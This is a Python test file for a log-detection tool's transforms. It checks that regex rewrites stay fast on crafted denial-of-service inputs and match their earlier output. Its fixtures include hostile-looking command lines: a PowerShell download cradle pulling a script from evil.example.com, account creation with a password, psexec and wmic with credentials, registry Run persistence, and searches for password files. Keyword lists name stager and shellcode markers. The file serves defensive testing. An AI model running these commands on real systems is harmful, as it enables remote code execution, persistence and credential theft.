"""The shipped transforms must stay linear on crafted input and keep their output.

Several transforms under config/transforms/ used regexes such as ``a.*b.*c``,
``\\$\\{[^}]+\\}`` or two greedy ``.+`` around a token. On a crafted
CommandLine or ScriptBlockText value (tokens repeated with the closing part
left out) Python's backtracking engine spent seconds to hours on one value.
They were rewritten to do the same matching in linear time.

tests/fixtures/transforms_pre_redos/ keeps the previous version of each file
as the reference: on short inputs, where backtracking is cheap, both versions
must return exactly the same string.
"""

import argparse
import random
import time
from pathlib import Path

import pytest

from zircolite.streaming import StreamingEventProcessor

ROOT = Path(__file__).parent.parent
NEW_DIR = ROOT / "config" / "transforms"
OLD_DIR = Path(__file__).parent / "fixtures" / "transforms_pre_redos"

# Largest CommandLine Windows accepts; ScriptBlockText is split into
# events well below it.
FIELD_MAX = 32767
# CPU seconds one worst-case value may cost. The previous versions took from
# about a second to hours at FIELD_MAX; the rewrites take milliseconds.
BUDGET = 1.0


@pytest.fixture(scope="module")
def processor():
    args = argparse.Namespace(all_transforms=False, transform_categories=None)
    return StreamingEventProcessor(
        config_file=str(ROOT / "config" / "config.yaml"), args_config=args
    )


def _func(processor, path):
    # Not _transform_value: it returns the input unchanged if the transform
    # raises, which would hide a rewrite that fails under the sandbox.
    func = processor._get_transform_func(path.read_text())
    assert func is not None, f"{path.name} did not compile"
    return func


def _fill(unit, size):
    return (unit * (size // len(unit) + 1))[:size]


def _two(first, second, size, share=0.4):
    head = int(size * share) // len(first) * len(first)
    return _fill(first, head) + _fill(second, size - head)


# (file, token alphabet for the differential run, worst-case inputs)
CASES = {
    "scriptblocktext_stagerdetect.py": (
        ["add-type", "ADD-Type", "dllimport", "kernel32", "ntdll", "iex", "IEX", "iex (",
         "iex(", "new-object net.webclient", "invoke-expression", "invoke-webrequest",
         "iwr", "invoke-restmethod", "frombase64string", ".load(", "amsi", "addscript",
         "begininvoke", "languagemode", "fulllanguage", "fulllanguagemode",
         "[powershell]::create()", "runspacefactory"],
        [_two("add-type ", "dllimport ", FIELD_MAX), _fill("iex(", FIELD_MAX),
         _fill(".load(", FIELD_MAX), _fill("addscript ", FIELD_MAX),
         _fill("languagemode ", FIELD_MAX), _fill("invoke-expression ", FIELD_MAX)],
    ),
    "scriptblocktext_xorpatterns.py": (
        ["foreach", "ForEach", "for", "for (", "for(", "-bxor", "-BXOR", "[byte[]]",
         "[Byte[]]", "[System.Byte[]]", "0x35", "55", "170", "255", "0xAA", "12"],
        [_fill("for(", FIELD_MAX), _fill("foreach ", FIELD_MAX), _fill("[byte[]]", FIELD_MAX),
         _fill("[System.Byte[]]", FIELD_MAX)],
    ),
    "scriptblocktext_shellcodeindicators.py": (
        ["virtualalloc", "VirtualAlloc", "0x40", "page_execute", "PAGE_EXECUTE", "kernel32",
         "0x90, 0x90", "\\x90\\x90", "intptr"],
        [_fill("virtualalloc", FIELD_MAX), _fill("VirtualAlloc(", FIELD_MAX)],
    ),
    "scriptblocktext_networkiocs.py": (
        ["a", "ab", "-", "--", ".", ".com", ".COM", ".info", ".io", ".community", "_", "é",
         "K", "ſ", "1.2.3.4", "http://x", "evil", "-evil", "com", "net", ".net"],
        [_fill("a-", FIELD_MAX), _fill("ab-", FIELD_MAX), _fill("a", FIELD_MAX) + ".comx"],
    ),
    "scriptblocktext_obfuscationindicators.py": (
        ["${", "}", "${}", "$", "{", "`I", "'a'+'b'", "-join", "-f '", "-enc"],
        [_fill("${", FIELD_MAX), _fill("${a", FIELD_MAX)],
    ),
    "scriptblocktext_packerindicators.py": (
        ["${", "}", "aaaaa", "aaaaaaaaaa", "$", "{", "convertto-securestring",
         "ConvertTo-SecureString", "-key", "-Key", "securestringtobstr", "gzipstream",
         "iex", "iex iex"],
        [_fill("${", FIELD_MAX), _fill("${aaaaaaaaaaaaaaaaa", FIELD_MAX),
         _fill("convertto-securestring ", FIELD_MAX)],
    ),
    "commandline_extracted_creds.py": (
        ["net", "net ", "user", "user ", "use ", "\\\\srv\\c$", "/USER:", "schtasks", "/U",
         "/U ", "/P", "/P ", "wmic", "/user:", "/password:", "psexec", "-u ", "-p ", "bob",
         '"bob"', '"a b"', '"x\\"y"', '"', "pw", "/Uab", "a/P"],
        [_fill("schtasks ", FIELD_MAX // 3) + " /U " + "a" * (FIELD_MAX - FIELD_MAX // 3),
         _fill("wmic ", FIELD_MAX // 3) + " /user:" + "a" * (FIELD_MAX - FIELD_MAX // 3),
         _fill("psexec ", FIELD_MAX // 3) + " -u " + "a" * (FIELD_MAX - FIELD_MAX // 3),
         _fill("net ", FIELD_MAX // 3) + " user " + "a" * (FIELD_MAX - FIELD_MAX // 3),
         _fill("schtasks /U a ", FIELD_MAX), _fill("psexec -u a -p", FIELD_MAX),
         "schtasks /P x /U " + "a" * FIELD_MAX, _fill('schtasks /U "', FIELD_MAX)],
    ),
    "commandline_concatdeobfuscate.py": (
        ["'", "'{0}", "'{1}'", "{0}", "{12}", "-f", "-f ", " -f", "'a'", ",", "+", "^",
         "`a", "%x:~0,1%", "'power'", "'shell'", "  "],
        ["'{0}" + " " * (FIELD_MAX - 4), _fill("'{0} ", FIELD_MAX),
         "'{0}" + _fill(" -f", FIELD_MAX)],
    ),
    "commandline_persistencecategory.py": (
        ["reg add", "reg  add", "set-itemproperty", "new-itemproperty", "\\run", "\\runonce",
         "\\run2", "\\environment\\", "path", ".lnk", "startup", "shell:startup",
         "schtasks /create"],
        [_two("reg add ", "\\environment\\", FIELD_MAX), _fill("reg add ", FIELD_MAX),
         _fill(".lnk", FIELD_MAX)],
    ),
    "commandline_datastaging.py": (
        ["zip", " zip ", "-r", "xcopy", " xcopy ", "/s", "/e", "copy", " copy ", "*.",
         "sqlcmd ", "-q", "-Q", "sqlite3 ", ".dump", "findstr", "dir", "find", "ls",
         "get-childitem", ".doc", ".docx", ".pem", ".pst", "rar a", "7z a", "robocopy"],
        [_fill("ls", FIELD_MAX), _fill(" copy ", FIELD_MAX), _fill(" xcopy ", FIELD_MAX),
         _fill("sqlcmd ", FIELD_MAX), _fill(" zip ", FIELD_MAX)],
    ),
}

_FILLER = [" ", " ", "\n", "\t", "'", '"', "\\", "-", ".", "a", "X", "1", "_", "é",
           "$", "{", "}", "(", ")", ":", "/", ","]


def _random_inputs(alphabet, count, seed):
    rng = random.Random(seed)  # noqa: S311 -- reproducible test data
    values = []
    for _ in range(count):
        parts = []
        for _ in range(rng.randint(0, 12)):
            if rng.random() < 0.3:
                parts.append(rng.choice(_FILLER))
                continue
            token = rng.choice(alphabet)
            if " " in token and rng.random() < 0.3:
                # \s in a pattern matches a newline where '.' does not
                token = token.replace(" ", rng.choice(["\n", " \n", "\r\n"]), 1)
            parts.append(token)
        value = "".join(parts)
        values.append(value.upper() if rng.random() < 0.15 else value)
    return values


def _creds_inputs(count, seed):
    """Command lines shaped like the ones the credential patterns look for."""
    rng = random.Random(seed)  # noqa: S311 -- reproducible test data
    tools = ["net", "schtasks", "wmic", "psexec", "net use", "net user"]
    flags = ["/U", "/P", "/user:", "/password:", "-u", "-p", "user", "use", "/USER:",
             "\\\\srv\\c$"]
    tokens = ["bob", '"bob"', '"a b"', '"x\\"y"', '"open', '""', "a/P", "x", "p@ss", '"']
    spaces = [" ", "  ", "\t", "\n", ""]
    values = []
    for _ in range(count):
        parts = [rng.choice(tools) + " "] if rng.random() < 0.7 else []
        for _ in range(rng.randint(1, 9)):
            parts.append(rng.choice(rng.choice([tools, flags, flags, tokens, tokens, spaces])))
            parts.append(rng.choice(spaces))
        values.append("".join(parts))
    return values


REALISTIC = {
    "commandline_extracted_creds.py": [
        ("net user admin P@ssw0rd /add", "admin|P@ssw0rd"),
        ('net use \\\\dc01\\c$ /USER:CORP\\admin "S3cret pass"',
         '\\\\dc01\\c$|CORP\\admin|"S3cret pass"|S3cret pass'),
        ("schtasks /create /S host /U admin /P secret /TN t /TR x", "admin|secret"),
        ("wmic /node:host /user:admin /password:secret process call create x",
         "admin|secret"),
        ("psexec \\\\host -u admin -p secret cmd.exe", "admin|secret"),
        ("cmd.exe /c whoami", ""),
    ],
    "scriptblocktext_stagerdetect.py": [
        ("IEX (New-Object Net.WebClient).DownloadString('http://x/a')", "STAGER:STAGED_IEX"),
        ("Add-Type -TypeDefinition '[DllImport(\"kernel32.dll\")]'", "STAGER:WIN32_API"),
    ],
    "commandline_persistencecategory.py": [
        ('reg add "HKCU\\Environment\\" /v Path /d C:\\x', "PERSIST:DLL_SEARCH"),
        ("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x",
         "PERSIST:REG_RUN"),
    ],
    "commandline_datastaging.py": [
        ("cmd /c dir /s C:\\Users\\*.docx", "STAGING:FILE_HUNT"),
        ("sqlcmd -S db -Q \"select 1\"", "STAGING:DB_DUMP"),
    ],
    "commandline_concatdeobfuscate.py": [
        ("powershell ('{0}{1}' -f 'power','shell')", "DEOBF:FORMAT_OP"),
        ("powershell ('{0} {1}'-f'a','b')", "DEOBF:FORMAT_OP"),
    ],
    "scriptblocktext_networkiocs.py": [
        ("iwr http://evil.example.com/a.ps1", "URL:http://evil.example.com/a.ps1|DOMAIN:example.com"),
    ],
    "scriptblocktext_packerindicators.py": [
        ("${aaaaaaaaaaaa} ${bbbbbbbbbbbb}", "PACKER:INVOKE_OBFUSCATION"),
        ("ConvertTo-SecureString $s -Key $k", "PACKER:SECURESTRING"),
    ],
}


def test_every_rewritten_file_has_a_reference():
    assert sorted(p.name for p in OLD_DIR.glob("*.py")) == sorted(CASES)


@pytest.mark.parametrize("name", sorted(CASES))
def test_same_output_as_previous_version(processor, name):
    old = _func(processor, OLD_DIR / name)
    new = _func(processor, NEW_DIR / name)
    alphabet = CASES[name][0]
    values = _random_inputs(alphabet, 1500, seed=len(name))
    if name == "commandline_extracted_creds.py":
        values += _creds_inputs(3000, seed=7)
    values += [value for value, _ in REALISTIC.get(name, [])]
    differ = [(v, old(v), new(v)) for v in values if old(v) != new(v)]
    assert differ == [], f"{name}: first differences {differ[:3]}"


@pytest.mark.parametrize(
    "name,value,expected",
    [(name, value, expected) for name, rows in sorted(REALISTIC.items()) for value, expected in rows],
)
def test_realistic_values(processor, name, value, expected):
    assert _func(processor, NEW_DIR / name)(value) == expected


@pytest.mark.parametrize("name", sorted(CASES))
def test_worst_case_is_fast(processor, name):
    new = _func(processor, NEW_DIR / name)
    for value in CASES[name][1]:
        started = time.process_time()
        new(value)
        spent = time.process_time() - started
        assert spent < BUDGET, f"{name} spent {spent:.2f}s CPU on a {len(value)}-char value"


# Under re.IGNORECASE a pattern's i also matches dotless and dotted I, its s
# the long s and its k the Kelvin sign; str.lower() maps none of them to
# ASCII. A shortcut that tests a lowercased copy for a keyword must not
# decide differently from the regex it stands in front of.
_FOLDED = {"i": ["\u0131", "\u0130"], "s": ["\u017f"], "k": ["\u212a"]}
_KEYWORD_VALUES = [
    "Add-Type -TypeDefinition '[DllImport(\"kernel32.dll\")]' VirtualAlloc(0, 4096, 0x3000, 0x40)",
    "$b = [byte[]](1..9); foreach ($x in $b) { $x -bxor 0x35 }; for ($i=0) { $b[$i] -bxor 55 }",
    "cmd /c zip -r out.zip C:\\Users && xcopy /s C:\\a D:\\b && copy *.docx D:\\x && sqlcmd -S db -Q x",
    "sqlite3 db .dump; dir /s *.pdf; findstr /s password *.key",
    "net user admin P@ss /add; schtasks /create /U bob /P pw; wmic /user:x /password:y; psexec -u a -p b",
    "iwr http://evil.example.com/a.ps1; resolve evil.info; 10.0.0.5",
]


def _folded_variants(value):
    out = [value]
    for ascii_char, folds in _FOLDED.items():
        for fold in folds:
            out.append(value.replace(ascii_char, fold))
            out.append(value.replace(ascii_char.upper(), fold))
    return out


@pytest.mark.parametrize("name", sorted(CASES))
def test_case_folded_keywords_decide_as_before(processor, name):
    old = _func(processor, OLD_DIR / name)
    new = _func(processor, NEW_DIR / name)
    values = [v for value in _KEYWORD_VALUES for v in _folded_variants(value)]
    differ = [(v, old(v), new(v)) for v in values if old(v) != new(v)]
    assert differ == [], f"{name}: first differences {differ[:3]}"
